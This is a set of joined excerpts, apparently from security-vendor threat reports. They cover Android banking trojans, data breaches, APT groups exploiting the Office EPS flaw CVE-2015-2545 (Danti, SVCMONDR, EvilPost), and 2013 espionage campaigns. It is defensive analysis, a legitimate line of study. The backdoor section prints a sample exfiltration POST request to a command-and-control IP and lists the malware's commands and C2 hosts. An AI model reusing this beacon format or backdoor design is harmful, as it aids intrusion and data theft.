and installs, usually secretly, various programs using superuser privileges. Such activity quickly renders the infected device virtually unusable due to the amount of adverts and new applications on it. Because this Trojan can gain superuser privileges, it is very difficult to delete the programs that it installs. In our report IT threat evolution in Q1 2016 we wrote about the Trojan-Banker.AndroidOS.Asacub family of banking malware. Representatives of this family have an unusual technique for bypassing the security mechanisms used by operating systems \xe2\x80\x93 they overlay the regular system window requesting device administrator privileges with their own window containing buttons. The Trojan thereby conceals the fact that it is gaining elevated privileges in the system, and tricks the user into approving these privileges. In Q2 2016, Asacub introduced yet another method for deceiving users: the Trojan acquired SMS messenger functionality and started offering its services in place of the device\xe2\x80\x99s standard SMS app. Dialog window of Trojan-Banker.AndroidOS.Asacub.i asking for the rights to be the main SMS application This allows the Trojan to bypass system constraints first introduced in Android 4.4 as well as delete or hide incoming SMSs from the user. Back in October 2015, we wrote about representatives of the Trojan-PSW.AndroidOS.MyVk family that steal passwords from user accounts on the VK.com social network. This quarter, those responsible for distributing Trojans from this family introduced a new approach for bypassing Google Play security mechanisms that involved first publishing an app containing useful functionality with no malicious code. Then, at least once, they updated it with a new version of the application \xe2\x80\x93 still without any malicious code. It was more than a month after the initial publication that the attackers eventually added malicious code to an update. As a result, thousands of users downloaded Trojan-PSW.AndroidOS.MyVk.i. Data breaches Personal information is a valuable commodity, so it\xe2\x80\x99s no surprise that cybercriminals target online providers, looking for ways to bulk-steal data in a single attack. We\xe2\x80\x99ve become accustomed to the steady stream of security breaches reported in the media. This quarter has been no exception, with reported attacks on beautifulpeople.com , the nulled.io hacker forum (underlining the fact that it\xe2\x80\x99s not just legitimate systems that are targeted), kiddicare , Tumblr and others. Some of these attacks resulted in the theft of huge amounts of data, highlighting the fact that many companies are failing to take adequate steps to defend themselves. It\xe2\x80\x99s not simply a matter of defending the corporate perimeter. There\xe2\x80\x99s no such thing as 100 per cent security, so it\xe2\x80\x99s not possible to guarantee that systems can\xe2\x80\x99t be breached. But any organization that holds personal data has a duty of care to secure it effectively. This includes hashing and salting customer passwords and encrypting other sensitive data. Consumers can limit the damage of a security breach at an online provider by ensuring that they choose passwords that are unique and complex: an ideal password is at least 15 characters long and consists of a mixture of letters, numbers and symbols from the entire keyboard. As an alternative, people can use a password manager application to handle all this for them automatically. Unfortunately, all too often people use easy-to-guess passwords and re-use the same password for multiple online accounts \xe2\x80\x93 so that if the password for one is compromised, all the victim\xe2\x80\x99s online IDs are vulnerable. This issue was highlighted publicly in May 2016 when a hacker known as \xe2\x80\x98Peace\xe2\x80\x99 attempted to sell 117 million LinkedIn e-mails and passwords that had been stolen some years earlier . More than one million of the stolen passwords were \xe2\x80\x98123456\xe2\x80\x99! Many online providers offer two-factor authentication \xe2\x80\x93 i.e. requiring customers to enter a code generated by a hardware token, or one sent to a mobile device, in order to access a site, or at least in order to make changes to account settings. Two-factor authentication certainly enhances security \xe2\x80\x93 if people choose to take advantage of it. Several companies are hoping to replace passwords altogether. Apple allows fingerprint authorization for iTunes purchases and payments using Apple Pay. Samsung has said it will introduce fingerprint, voice and iris recognition for Samsung Pay. Amazon has announced \xe2\x80\x98selfie-pay\xe2\x80\x99. MasterCard and HSBC have announced the introduction of facial and voice recognition to authorize transactions. The chief benefit, of course, is that it replaces something that customers have to remember (a password) with something they have \xe2\x80\x93 with no opportunity to short-circuit the process (as they do when they choose a weak password). Biometrics are seen by many as the way forward. However, they are not a security panacea. Biometrics can be spoofed, as we\xe2\x80\x99ve discussed before ( here , here and here ); and biometric data can be stolen. In the end, multi-factor authentication is essential \xe2\x80\x93 combining something you know , something you have and something you are .

using CVE-2015-2545 Platinum (also known as TwoForOne) APT16 EvilPost SPIVY Danti and SVCMONDR Danti attacks Initial vector Exploit March attack March attack \xe2\x80\x93 payload SVCMONDR: the Taiwan case Conclusions Appendix A: EPS Objects their payload and http.exe trojan analysis EPS Objects Payload analysis Backdoor http.exe trojan Appendix B: Danti sample hashes Appendix C: sample hashes of SVCMONDR attacks    CVE-2015-2545 is a vulnerability discovered in 2015 and corrected with Microsoft\xe2\x80\x99s update MS15-099. The vulnerability affects Microsoft Office versions 2007 SP3, 2010 SP2, 2013 SP1 and 2013 RT SP1.  The error enables an attacker to execute arbitrary code using a specially crafted EPS image file. The exploit uses PostScript and can evade Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP) protection methods.  The exploit was discovered in the wild in August 2015, when it was used in a targeted attack by the Platinum group , presumably against targets in India. Over the following months, there was significant growth in the number of threat actors using the vulnerability as a primary tool for initial penetration, with both the attack groups and their targets located in South-East and Central Asia and the Far East.  In this research paper, we discuss examples of attacks using the CVE-2015-2545 vulnerability undertaken by some of these groups.  Overview of groups using CVE-2015-2545   Platinum (also known as TwoForOne)  The group is believe to originate from South-East Asia. Its attacks can be traced as far back as 2009. The group is notable for exploiting 0-day vulnerabilities and carrying out a small number of highly focused targeted attacks \xe2\x80\x93 mostly against government agencies in Malaysia, Indonesia, China and India.  This group was the first to exploit the CVE-2015-2545 vulnerability. After the vulnerability was corrected with Microsoft updates in September and November 2015, no new Platinum attacks exploiting this vulnerability have been detected.  Microsoft presented the activity of this group at the SAS conference in February 2016, and in its paper: PLATINUM: Targeted attacks in South and Southeast Asia .  APT16  The group has been known for several years and is believed to be of Chinese origin. In November and December 2015, it used a modified exploit for CVE-2015-2545 in attacks against information and news agencies in Taiwan. These attacks were described in a FireEye research paper \xe2\x80\x93 The EPS Awakens \xe2\x80\x93 Part 2 .  EvilPost  In December 2015, Kaspersky Lab became aware of a targeted attack against the Japanese defense sector. In order to infect victims, the attacker sent an email with an attached DOCX file exploiting the CVE-2015-2545 vulnerability in Microsoft Office using an embedded EPS (Encapsulated Postscript) object. The EPS object contained a shellcode that dropped and loaded a 32-bit or 64-bit DLL file depending on the system architecture. This, in turn exploited another vulnerability to elevate privileges to Local System (CVE-2015-1701) and download additional malware components from the C&C server.  The C&C server used in the attack was located in Japan and appears to have been compromised. However, there is no indication that it has ever been used for any other malicious purpose. Monitoring of the server activity for a period of several months did not result in any new findings. We believe the attackers either lost access to the server or realized that it resulted in too much attention from security researchers, as the attack was widely discussed by the Japanese security community.  According to our research partner in Japan, the original EvilPost attack in December 2015 arrived as a spear-phishing email with a Word document attached.  This document embedded an EPS object file, which triggered a vulnerability in the EPS format handler in Microsoft Word. Even with an exploit component, Microsoft Word rendered the document correctly and displayed the decoy message. The document is written in good Japanese, as shown below.   It has been used to decoy New Year impressions of defense-related organizations.  This attack was also described in the FireEye report , mentioned above.  An overview of the activity of the EvilPost group activity was provided to subscribers of the Kaspersky Lab Threat Intelligence Service in March 2016. For information about the service, please write to intelreports@kaspersky.com .  SPIVY  In March and April 2016, a series of emails laced with an exploit forCVE-2015-2545 were detected. The emails were sent in spear-phishing attacks, presumably targeting organizations in Hong Kong. Identifying a specific group behind these attacks is difficult because they used a new variant of a widely available backdoor known as PoisonIvy (from which the name of the group, SPIVY, is derived). A description of these incidents can be found in the PaloAlto blog .  Danti and SVCMONDR  These two groups have not yet been publicly described. An overview of their attacks and the tools used is provided in this report.   Danti attacks  Danti (Kaspersky Lab\xe2\x80\x99s internal name) is an APT actor that has been active at least since 2015, predominantly targeting Indian government organizations. According to our telemetry, Danti has also been actively hitting targets in Kazakhstan, Kyrgyzstan, Uzbekistan, Myanmar, Nepal and the Philippines The group implemented a new campaign in February and March 2016, using a repurposed implementation of the CVE-2015-2545 exploit with custom shellcode. In order to infect the victim, the attackers distributed spear-phishing emails with an attached DOCX file exploiting the CVE-2015-2545 vulnerability in Microsoft Office. The exploit is based on a malformed embedded EPS (Encapsulated Postscript) object. This contains the shellcode that drops a backdoor, providing full access to the attackers. Main findings:   Danti, a previously unknown group, is probably related to NetTraveller and DragonOK  In February-March 2016 the group was observed using CVE-2015-2545  It remains active, conducting attacks against Indian diplomatic organizations  Related attacks have been observed against Central and South East Asia targets   The campaign leveraging the exploit for CVE-2015-2545 took place in February 2016. As a result, several emails with attached DOCX files were uploaded to VirusTotal. The email recipients were connected to the Indian Ministry of External Affairs, as can be seen below:  dsfsi@nic.in, the Foreign Service Institute, Ministry of Foreign Affairs (Under Secretary (FT/NRG), dsfsi@mea.gov.in)  chumarpost@gmail.com, possibly related to the Chumar military post in India, a disputed area between India and China (the mail server is the same as the Indian Ministry of Foreign Affairs- vastuXX.nic.in)  chancery@indianembassy.hu, the Indian embassy in Hungary  amb.copenhagen@mea.gov.in, the Indian Embassy in Denmark  amb.bogota@mea.gov.in, the Indian embassy in Colombia  All these attacks took place between the 2 nd and 29 th of February, 2016.    Target and date  Attachment name  Sender    Indian embassy in Hungary 2 nd February  Mission List.doc  unknown (original email was forwarded)    Indian embassy in Denmark 2 nd February  HQ List.doc  mout.gmx.com ([74.208.4.200])    Indian embassy in Colombia 2 nd February  HQ List.doc  mout.gmx.com ([74.208.4.201])    DSFSI 24 th February  India\xe2\x80\x99s 10 Top Luxury Hotels.doc  191.96.111.195 via mout.gmx.com ([74.208.4.201])    Chumapost 29 th February  India\xe2\x80\x99s 10 Top Luxury Hotels.doc  43.227.113.129 via mout.gmx.com ([74.208.4.200])    In the case of the Indian Embassy in Hungary, it looks like the original message was forwarded from the embassy to the Indian IT security team in the Ministry of Foreign Affairs, and uploaded later to Virus Total. Initial vector The emails that were analysed had originally been sent via \xe2\x80\x9c3capp-mailcom-lxa06.server.lan\xe2\x80\x9d, perhaps using a spam-mailer program. In all known cases, the sender used the same gate at 74.208.4.200/74.208.4.201 (mout.gmx.com). The email messages changed for different waves of the campaign. When the campaign started in February 2 nd , the emails carried the subject headers \xe2\x80\x9cMission List\xe2\x80\x9d and \xe2\x80\x9cHQ List\xe2\x80\x9d, and forged the identity of a real sender. Original message used in the first wave of attacks As can be seen above, the original email was supposedly forwarded from Anil Kumar Balani , Director of the Department of Information Technology at the Indian Ministry of Communications & Information Technology. Mission List decoy document At the same time, attackers sent a slightly different document with the subject \xe2\x80\x9cHQ List\xe2\x80\x9d to other Indian embassies (for example, those in Denmark and Colombia): Original HQ List email K.Nagaraj Naidu is Director of the Investments Technology Promotion Division in the Ministry of External Affairs, and a former Counsellor (T&C) at the Embassy of India in China. HQ List decoy document Both files (\xe2\x80\x9cMission List\xe2\x80\x9d and \xe2\x80\x9cHQ list\xe2\x80\x9d) have different decoy content, but both use the same CVE-2015-2545 EPS exploit (image1.eps, MD5 a90a329335fa0af64d8394b28e0f86c1). Interestingly, as can be seen in their metadata, both files were modified by the user \xe2\x80\x9cIndia\xe2\x80\x9d on 01.02.2016, just one day before they were sent to targets.    \xe2\x80\x9cHQ List\xe2\x80\x9d metadata  \xe2\x80\x9cMission List\xe2\x80\x9d metadata            For the attacks at the end of February, the attackers decided to use the less relevant subject header of \xe2\x80\x9c10 top luxury hotels in India\xe2\x80\x9d, sent from an unknown sender. Top Luxury Hotels spear-phishing email This new attachment contains the same EPS exploit, but uses a different decoy document and a new payload. Top 10 Luxury Hotels decoy document The text of the document was copied from a Forbes article published in 2007. According to its metadata, the document was created in June 2015, so it has probably been used before in unknown attacks. However, the same mail gate (mout.gmx.com) was used as for the 2nd February attacks. Email header from February 29 Email header from February 24 All the \xe2\x80\x9cdoc\xe2\x80\x9d files are Web Archive Files and contain decoy documents and a malicious EPS. The structure of the WAF files is the same in all three cases: Web archive structure Exploit The attackers used at least one known 1-day exploit: the exploitforCVE-2015-2545 \xe2\x80\x93 EPS parsing vulnerability in EPSIMP32.FLT module, reported by FireEye, and patched by Microsoft on 8 September 2015 with MS15-099. We are currently aware of about four different variants of the exploit. The original one was used in August 2015 against targets in India by the Platinum (TwoForOne) APT group. Original EPS exploit, used in August 2015 The second (which is a modified variant of the original exploit) was used in EvilPost attacks against Japan in 2015, and then reused by cybercriminals in March 2016. This variant was also used by the APT16 group (ELMER backdoor) in Taiwan in December 2015. The second variant is easily recognized by the specific strings in its EPS shellcode: The \xe2\x80\x9ch:\\test.txt\xe2\x80\x9d string could have been forgotten by the exploit developer The third variant was used in December 2015 against a Taiwanese organization, and in February 2016 against an Indian diplomatic organization. This variant uses different shellcode but is based on the original exploit from the Platinum (TwoForOne) APT: Can be recognized by \xe2\x80\x9cadd2 <eb135\xe2\x80\x9d substring In the third variant, the binaries with the encrypted malicious exe file and the decoy document can be found at the end of the files. In the third variant, the binary starts with \xe2\x80\x9cPdPD\xe2\x80\x9d (50 64 50 44), a marker previously used for encrypted binaries by a number of APT groups (Anchor Panda, Samurai Panda, Temper Panda). Encrypted data at the end of the eps file The decryption function is 1-byte XOR with a key from \xe2\x80\x9cx00\xe2\x80\x9d to \xe2\x80\x9cxff\xe2\x80\x9d and replacement of the Odd byte for an Even byte in several hundred bytes from the header. Decrypted exe file Decrypted decoy document We detected a few different EPS objects in the exploit and these are analyzed below. The fourth variant of the exploit is analyzed in the \xe2\x80\x9cMarch attack\xe2\x80\x9d section. Read more about EPS objects and Payload in the Appendix. March attack At the end of March 2016, we discovered a new wave of attacks by the Danti group against Indian governmental institutions. On March 28 th several malicious document were sent to various recipients at the Cabinet Secretariat of Government India from the email account of Ms. Richa Gaharwar (<richa.gaharwar@nic.in>), Deputy Secretary at The Department of Administrative Reforms and Public Grievances, the nodal agency of the Government of India. Email sent from the account of Ms. Richa Gaharwar The message was sent from an internal IP address using Oracle Communications Messenger. This could mean that the employee workstation used to send the malicious emails had been fully compromised. Email header The attachment contains the file \xe2\x80\x9cHolidays in India in 2016.docx\xe2\x80\x9d with the embedded EPS exploit. This time the attackers used the second variant of the exploit (previously used by the EvilPost and APT16 groups), with minor changes:  They removed the part with the \xe2\x80\x9ch:\\test.txt\xe2\x80\x9d strings  Dropped the binary added at the end of the EPS object (the same as in the third variant of the exploit)  Instead of using the \xe2\x80\x9cPdPD\xe2\x80\x9d string as a marker for binary, they used a new identifier: \xe2\x80\x9c1111111122222222\xe2\x80\x9d New identifier used All these changes created a new variant of the exploit, detected by very few antivirus products. The decoy document was created on January 27 th , and then modified by adding the EPS exploit on March 28 th , right before the attack. Decoy document According to its metadata, the document was created and modified by Chinese users: Decoy\xc2\xb4s metadata March attack \xe2\x80\x93 payload The dropped file is a RarSFX archive (331307 bytes). According to comments in the archive, this was also created by a Chinese user: The dropper installs four files in the system. The \xe2\x80\x9cAppinfo.dat\xe2\x80\x9d file launches \xe2\x80\x9cPotPlayerMini.exe\xe2\x80\x9d, monitors the memory periodically with the GlobalMemoryStatus API function and writes the results to \xe2\x80\x9cC:windowsmemstatus.txt\xe2\x80\x9d The main loader \xe2\x80\x9cPotPlayerMini.exe\xe2\x80\x9d is a legitimate multimedia player from Daum Communication . The file is signed with a legitimate signature from \xe2\x80\x9cDaum Communications Corp.\xe2\x80\x9d Digital signature information This legitimate file is used by the attackers to load a malicious, unsigned file from the same folder: PotPlayer.dll (the hardcoded PDB path inside is \xe2\x80\x9cC:UsersjohnDesktopPotPlayerReleasePotPlayer.pdb\xe2\x80\x9d). This, in turn executes appinfo.dat (the hardcoded PDB path inside is \xe2\x80\x9cD:BaiduYunDownloadServiceExeReleaseServiceExe.pdb\xe2\x80\x9d), which is a Yoda-compressed binary. The backdoor code is stored inside update.dat. The potplayer.dll \xe2\x80\x9cPreprocessCmdLineEx\xe2\x80\x9d export function:  Creates a service named \xe2\x80\x9cMemoryStatus\xe2\x80\x9d with a path to \xe2\x80\x9cappinfo.dat\xe2\x80\x9d file and sets it to HKEY_CURRENT_USER SoftwareMicrosoftWindowsCurrentVersionRun with the name \xe2\x80\x9cpotplayer\xe2\x80\x9d.  Opens \xe2\x80\x9cupdate.dat\xe2\x80\x9d file, decrypts it with xor operations and passes the execution to the result buffer.  \xe2\x80\x9cupdate.dat\xe2\x80\x9d, a backdoor: Makes its first GET request to hardcoded CnC \xe2\x80\x9cnewsupdate.dynssl.com/index.html\xe2\x80\x9d in order to get the new CnC in the response. If 407 response code is returned (Proxy authentication required) then the sample sends the request again with \xe2\x80\x9cproxyname\xe2\x80\x9d string as the proxy username and \xe2\x80\x9cproxypass\xe2\x80\x9d string as the proxy password. That suggests that may be the sample is compiled using some builder where these parameters must be set manually and in this specific sample were not changed from default. Finds \xe2\x80\x9c8FC628C9F43D42E2B77C2801518AF2A5\xe2\x80\x9d substring and decrypts it using AES CTR mode thrice using three 16-bytes keys. Makes a POST request to the new CnC with \xe2\x80\x9cim=validate\xe2\x80\x9d URL parameter and expects \xe2\x80\x9csuccess\xe2\x80\x9d string as the response. Forms the following structure in order to send to CnC in POST-request after AES encryption:  \xe2\x80\x9cCFB4CDE8-9285-4CC2-ACE2-CD9CCDF22C0D\xe2\x80\x9d string  Local IP  Host name  0x3E9 dword  OS version  SYSTEM_INFO structure  Decrypts the response using AES with one key. Commands:  Lists files in directory  Enumerates drives and their type  Enumerates given registry key and value  Enumerates processes  Deletes given file  Creates given process  Moves or copies given file  Uploads file  Writes to file and launches it  Enumerates services  Terminates given process  Provides shell via cmd.exe  The malware connects to the following C2s:  newsupdate.dynssl.com (103.61.136.120)  dnsnews.dns05.com (118.193.12.252)  The connection: The two hosts are dynamic DNS subdomains, using the provider CHANGEIP DNS. SVCMONDR: the Taiwan case In December 2015, we uncovered another example of the type of shellcode found in the exploit for CVE-2015-2545. On 11 December, a spear-phishing email was sent by attackers to an employee of a Taiwanese security software reseller. Spear-phishing email The attachment contained a Web Archive File with \xe2\x80\x9c1-3\xe8\xaa\xaa\xe6\x98\x8e\xe6\xaa\x94.doc\xe2\x80\x9d and a malicious EPS file inside. \xe2\x80\x9c1-3\xe8\xaa\xaa\xe6\x98\x8e\xe6\xaa\x94.doc\xe2\x80\x9d This EPS (98c57aa9c7e3f90c4eb4afeba8128484) is exploit CVE-2015-2545 and contains an encrypted binary starting with \xe2\x80\x9cPdPD\xe2\x80\x9d (50 64 50 44), the same as seen in the Danti attacks. The structure of the Web Archive also carries references to the same files as the Danti group (with image002.gif and \xe2\x80\x9cimage002.eps\xe2\x80\x9d.) However, the files themselves are absent from the archive. Part of the Web Archive This resemblance could mean that we can attribute this case to the Danti group. However, it could also be a coincidence or yet another case of different groups using the same malicious code. That\xe2\x80\x99s why we are noting this incident separately from the Danti group\xe2\x80\x99s activity. Interestingly, in the first few days of December, another group \xe2\x80\x93 APT16 (FireEye\xe2\x80\x99s classification) also targeted Taiwan-based organizations with a CVE-2015-2545 EPS exploit, and its emails originated from the same domain as the one sent by the SVCMONDR attackers. However, it used another type of shellcode and a different backdoor \xe2\x80\x93 ELMER . After opening the doc file (which is again a Web Archive File), the exploit drops and executes the Trojan program \xe2\x80\x9csvcmondr.exe\xe2\x80\x9d (8052234dcd41a7d619acb0ec9636be0b). This queries the registry: \xe2\x80\x9cHKEY_USERSSoftwareMicrosoftWindowsCurrentVersionInternet SettingsConnectionsDefaultConnectionSettings\xe2\x80\x9d and \xe2\x80\x9cHKCUSoftwareMicrosoftWindowsCurrentVersionInternetSettingsConnectionsDefaultConnectionSettings\xe2\x80\x9d and compares the values. If they don\xe2\x80\x99t coincide, it sets the \xe2\x80\x9cDefaultConnectionSettings\xe2\x80\x9d value from the HKEY_USERS to HKCU key. It sets values taken from:  HKEY_USERSSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZones3 {A8A88C49-5EB2-4990-A1A2-0876022C854F}  HKEY_USERSSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZones3 {AEBA21FA-782A-4A90-978D-B72164C80120}  HKEY_USERSSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZones31A10  To the appropriate HKCU key (for example: HKCUSoftwareMicrosoftWindowsCurrentVersionInternet SettingsZones3 {A8A88C49-5EB2-4990-A1A2-0876022C854F}, etc.). Then forms the structure in order to send it to the CnC in a POST-request with the following fields:  0x8888 constant  0x8000 constant  18-bytes hex string based on CoCreateGuid function  Local IP  MAC address  Example of POST request It encodes the resulting structure with base64. Example of a POST request: POST / HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32) Host: 59.188.13.204:9080 Content-Length: 112 Connection: Keep-Alive Cache-Control: no-cache AAAAAIiIAAAAgAAAAAAAAGQwNTRlYTkxMDAwMGEyZmU3NAAAAAAAAAAAAAAAAAAAMTAuNjMuMTIuNAAAAAAAADAwMEMyOUU5Nzg2QgAAAAAAAAAA Based on the CnC response, the sample:  Checks the password in the CnC response and compares it with the hardcoded password \xe2\x80\x9c1010\xe2\x80\x9d in its configuration structure. If the password is valid, it sets a \xe2\x80\x9ccertified\xe2\x80\x9d flag and can further process the following commands.  Launches given command line with ShellExecute, writes output results to %tmp% file, sends results to CnC and deletes the file.  Downloads file to %Temp% folder.  Uploads given file to CnC.  Sets sleep interval.  All results sent to the CnC after processing commands are encrypted with RC4 with a MAC-address as a key. The CnC points to an IP address in Hong Kong. This IP address belongs to a local private company, but falls within a range of IP addresses that belong to another enterprise that has already been identified as a host location for command and control servers that communicate with malware. The CnC has been used in other APT incidents, attributed by FireEye to the group \xe2\x80\x9cadmin@338\xe2\x80\x9d aka \xe2\x80\x9cTemper Panda\xe2\x80\x9d (59.188.0.197, accounts.serveftp.com). In general, this IP address space from \xe2\x80\x9cNew World Telecom HK\xe2\x80\x9d is one of the favorite places used by different Chinese-origin APT groups to host command & control servers/proxies. Another detail suggesting a possible relationship between SVCMONDR and Temper Panda is the use of the \xe2\x80\x9cPdPD\xe2\x80\x9d (50 64 50 44) marker for encrypted binaries. According to Crowdstrike, the same marker has been used previously by a number of APT groups (Anchor Panda, Samurai Panda and Temper Panda). The latest known activity of \xe2\x80\x9cadmin@338\xe2\x80\x9d was in August 2015, when it was used to target Hong Kong-based media using its own tools, LOWBALL and BUBBLEWRAP. However, we are unable to draw any conclusion regarding the relationship between the SVCMONDR group and Temper Panda. According to KSN data, in addition to Taiwan, there are some SVCMONDR victims in Thailand. Conclusions We are currently aware of at least four different APT actors actively using exploits of the CVE-2015-2545 vulnerability: TwoForOne (also known as Platinum), EvilPost, APT16 and Danti. These groups have their own toolsets of malicious program. Danti\xe2\x80\x99s arsenal is more extensive than those of EvilPost and APT16, and in terms of functionality can be compared with Platinum. All groups are focused on targets in the Asian region and have never been seen in incidents in Western Europe or the USA. The TwoForOne (Platinum) group is described in Microsoft research, APT16 in FireEye reports, and EvilPost and Danti in Kaspersky Lab private reports. Danti is highly focused on diplomatic entities. It may already have full access to internal networks in Indian government structures. According to Kaspersky Security Network, some Danti Trojans have also been detected in Kazakhstan, Kyrgyzstan, Uzbekistan, Myanmar, Nepal and the Philippines. Despite the fact that Danti uses a 1-day exploit, the group is able to make its own modifications to bypass current antivirus detections. A number of the modules used by Danti have the same functionality as previously known and used malicious programs like NetTraveller and DragonOK. The use of CVE-2015-2545 exploits is on the rise. In addition to the groups mentioned above, we have seen numerous examples of these exploits being used by traditional cybercriminals in mass mailings in February-April 2016. Such attacks mostly target financial institutions in Asia. Specifically, attacks have been recorded in Vietnam, the Philippines and Malaysia. There are reasons to believe that Nigerian cybercriminals are behind these attacks. In some cases, the infrastructure used is the same as the one we saw when analyzing the Adwind Trojan. We expect to see more incidents with this exploit and we continue to monitor new waves of attacks and the potential relationship with other attacks in the region.

on user computers    Q1 in figures   According to KSN data, Kaspersky Lab products detected and neutralized 1 345 570 352 threats in Q1 2013.  A total of 22,750 new modifications of malicious programs targeting mobile devices were detected this past quarter \xe2\x80\x94 that\xe2\x80\x99s more than half of the total number of modifications detected in all of 2012.  Some 40% of the exploits seen in the first quarter of this year target vulnerabilities in Adobe products.  Nearly 60% of all malicious hosts are located in three countries: the US, Russia, and the Netherlands.   Overview  The first quarter of 2013 turned out to be a busy time in IT security. This report will address the most significant events.  Cyberespionage and cyberweapons  Red October  At the very beginning of the year, Kaspersky Lab published a significant report with the results of a study on the global cyberespionage operation known as Red October . These attacks targeted various government agencies, diplomatic organizations and companies around the world. Analyzing the files and reconstructing the structure of the attack took several months. However, after a labor-intensive study, we were able to determine several key facts.  The attackers have been active over the past five years. The multifunctional platform that they used helped them quickly use new, expanded modules to collect information. In order to control and manage infected systems, they created more than 60 different domain names and several servers hosted in different countries. The command sever infrastructure is comprised of a chain of proxy servers.  In addition to traditional targeted attacks on workstations, Red October is also capable of stealing data from mobile devices, collecting data from network equipment, collecting files from USB drives, stealing email databases from local Outlook archives or from remote POP/IMAP servers, and extracting files from local FTP servers on the Internet.  MiniDuke  In February, FireEye published an analysis of a new malicious program that penetrates systems using a 0-day vulnerability in Adobe Reader (CVE-2013-0640). This became the first exploit capable of bypassing the Acrobat Reader sandbox. It downloaded a backdoor meant to steal data from an infected system. After obtaining examples of this malicious program for analysis, we gave it the name ItaDuke.  In time, we discovered several similar incidents targeting the very same vulnerability, only with different threats. The malicious program used by the cybercriminals was dubbed MiniDuke. An investigation into these incidents was conducted by the Hungarian company CrySys Lab. MiniDuke\xe2\x80\x99s victims turned out to be government agencies located in Ukraine, Belgium, Portugal, Romania, the Czech Republic and Ireland, as well as a research organization in Hungary, in addition to a research institute, two scientific research centers and a medical facility in the US. In total, we detected 59 victims in 23 countries.  One of the most interesting characteristics of the MiniDuke attacks was the combination of a threat with code written using a complex, \xe2\x80\x98old school\xe2\x80\x99 approach, and relatively new, yet tried-and-true, exploit technologies targeting Adobe Reader vulnerabilities.  The attackers sent out malicious PDF documents with exploits targeting versions 9 through 11 of Adobe Reader. The documents contained information about a seminar on human rights (ASEM), news about Ukraine\xe2\x80\x99s foreign policy, and the plans of NATO countries. If an exploit was successful, the victim\xe2\x80\x99s computer would be infiltrated by a unique backdoor, small at just 20 KB, written in Assembler.  The cybercriminals used Twitter in this attack: in order to obtain C&C server addresses and subsequently download new malicious modules, the backdoor sought out special tweets from previously created accounts. As soon as the infected system established a connection with the command server, it would begin to receive encrypted modules (backdoors) bundled with GIF files. These modules had relatively simple functions: copying, moving and deleting files, creating directories, and downloading new malicious programs.  APT1  In February, Mandiant published a large PDF report on the attacks launched by a certain group of Chinese hackers going by the name of APT1. The term APT (Advanced Persistent Threat) is still a buzz word. Yet sometimes it refers to threats or attacks that aren\xe2\x80\x99t exactly \xe2\x80\x9cadvanced\xe2\x80\x9d. However, in the case of APT1, \xe2\x80\x9cadvanced\xe2\x80\x9d is no exaggeration \xe2\x80\x94 this campaign run by Chinese hackers is large-scale and not to be taken lightly.  The Mandiant reports starts off by stating that APT1 appears to be a division of the Chinese army. The company even included a possible physical address for the division, and estimated the number of people involved and the infrastructure used. Mandiant believes that APT1 has been operating since 2006, and that over the course of 6 years it has managed to steal terabytes of data from at least 141 organizations. The victim organizations are primarily located in English-speaking countries. No doubt these massive attacks would not have been possible without real support from hundreds of people and a developed, modern infrastructure.  This is definitely not the first time that China has faced accusations of its involvement of cyberattacks against government agencies and organizations in countries around the world. And there is nothing particularly surprising about the Chinese government\xe2\x80\x99s firm rejection of the assertions made in the Mandiant report.  Note that up till now, no country has ever claimed responsibility for any cyberespionage attack, or has admitted to involvement in cyberespionage under pressure from public or agency evidence.  TeamSpy  In March 2013, information was published about the latest in a line of complex attacks targeting high-ranking politicians and human rights advocates in the CIS and Eastern Europe. The operation was dubbed \xe2\x80\x9c TeamSpy ,\xe2\x80\x9d as the remote admin program TeamViewer was used by the attackers to control victim computers. The main objective of this attack was to gather information from user computers, starting with screenshots and ending with copies of .pgp files, including passwords and encryption keys.  Even though the tools used in the TeamSpy operation \xe2\x80\x94 and even the operation itself \xe2\x80\x94 didn\xe2\x80\x99t seem all that sophisticated or professional compared to the Red October operation, the TeamSpy attacks were also successful.  Stuxnet 0.5  Incidents that require months of persistent effort to investigate are relatively rare in the antivirus industry. Even rarer are events that remain relevant even three years after they take place \xe2\x80\x94 like the detection of Stuxnet, for example. Although this worm has been studied by numerous antivirus companies, there are still many modules that have barely been examined, if at all. It is important to remember that there were several version of Stuxnet, and that the earliest of them appeared back in 2009. Experts suggested several times that there were (or still are) even earlier versions of this worm, although there was no hard evidence.  But in the end, those assertions were confirmed. In late February, Symantec published a study on a new \xe2\x80\x9cold\xe2\x80\x9d version of the worm \xe2\x80\x94 Stuxnet 0.5. This version turned out to be the earliest known modification of Stuxnet, and was active between 2007 and 2009. Furthermore, this version had some very interesting characteristics:   First of all, it was created on the same platform as Flame, not Tilded like subsequent Stuxnet modifications.  Second, the worm spread using infected files generated with Simatic Step 7 , and did not contain any exploits for Microsoft products.  Third, Stuxnet 0.5 was no longer proliferated after July 4, 2009 .  Finally, it was Stuxnet 0.5 that featured complete compatibility with Siemens 417 PLC (later versions of the work did not have this feature in full).   The results of the study of Stuxnet version 0.5 have provided more information about this malicious program in general. It\xe2\x80\x99s likely that we will find out even more information in the future. The same can be said about examples of cyberweapons detected after Stuxnet, as well as malware used in cyberespionage \xe2\x80\x94 there\xe2\x80\x99s a lot we still don\xe2\x80\x99t know.  Targeted attacks  Attacks against Tibetan and Uyghur activists  In the first quarter of 2013, targeted attacks continued against Tibetan and Uyghur activists. In order to achieve their goals, the attackers used everything at their disposal, and users of Mac OS X, Windows, and Android were subjected to attacks.  In January-February, Kaspersky Lab detected a substantial increase in the number of targeted attacks on Uyghurs using Mac OS X. All of these attacks used the CVE-2009-0562 vulnerability, which was patched by Microsoft nearly four years ago. The exploit for this vulnerability was sent out in MS Office documents, which were easy to recognize from the \xe2\x80\x9ccaptain\xe2\x80\x9d author tag. If the exploit was successfully executed, a backdoor for Mac OS X was downloaded in the form of a Mach-O file. This small backdoor has a very specific function: it installs another backdoor and a program that steals personal data (contacts).  Kaspersky Lab recorded the attacks against the Tibetan activists in mid-March 2013. This time, the attackers used the exploit mentioned above (CVE-2013-0640 \xe2\x80\x94 previously used in ItaDuke attacks) to get around the sandbox in Acrobat Reader X and infect the targeted computers.  In late March 2013, users of Android devices also fell victim to this wave of attacks. After the inbox of a well-known Tibetan activist was hacked, mailings from his address started coming out with an APK file attachment, which turned out to be a malicious program for Android (Kaspersky Lab products have labeled it Backdoor.AndroidOS.Chuli.a). This threat stealthily 